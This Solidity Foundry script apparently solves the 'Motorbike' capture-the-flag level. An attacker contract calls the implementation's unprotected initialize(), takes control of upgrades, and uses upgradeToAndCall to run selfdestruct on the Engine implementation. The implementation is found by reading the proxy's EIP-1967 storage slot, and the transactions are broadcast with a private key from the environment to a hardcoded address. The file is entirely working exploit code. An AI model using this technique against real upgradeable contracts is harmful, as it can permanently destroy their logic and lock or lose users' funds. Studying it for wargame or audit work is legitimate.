// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

import "../src/Motorbike.sol";
import {Script} from "forge-std/Script.sol";

contract AttackerContract {
    Engine engineInstance;

    constructor (address _address) public {
        engineInstance = Engine(_address);
    }

    function attack() public {
        engineInstance.initialize();
        engineInstance.upgradeToAndCall(address(this), abi.encodeWithSignature("killed()"));
    }

    function killed() external {
        selfdestruct(address(0));
    }
}

contract MotorbikeAttack is Script {
    Motorbike public motorbike = Motorbike(0xA44d8A336bBe6940483aca2DE64f2e847A022170);
    bytes32 internal constant _ENGINE_SLOT_ADDRESS = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    Engine public engine = Engine((uint160(uint256(vm.load(address(motorbike), _ENGINE_SLOT_ADDRESS)))));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        AttackerContract attackerContract = new AttackerContract(address(engine));

        attackerContract.attack();

        vm.stopBroadcast();
    }
}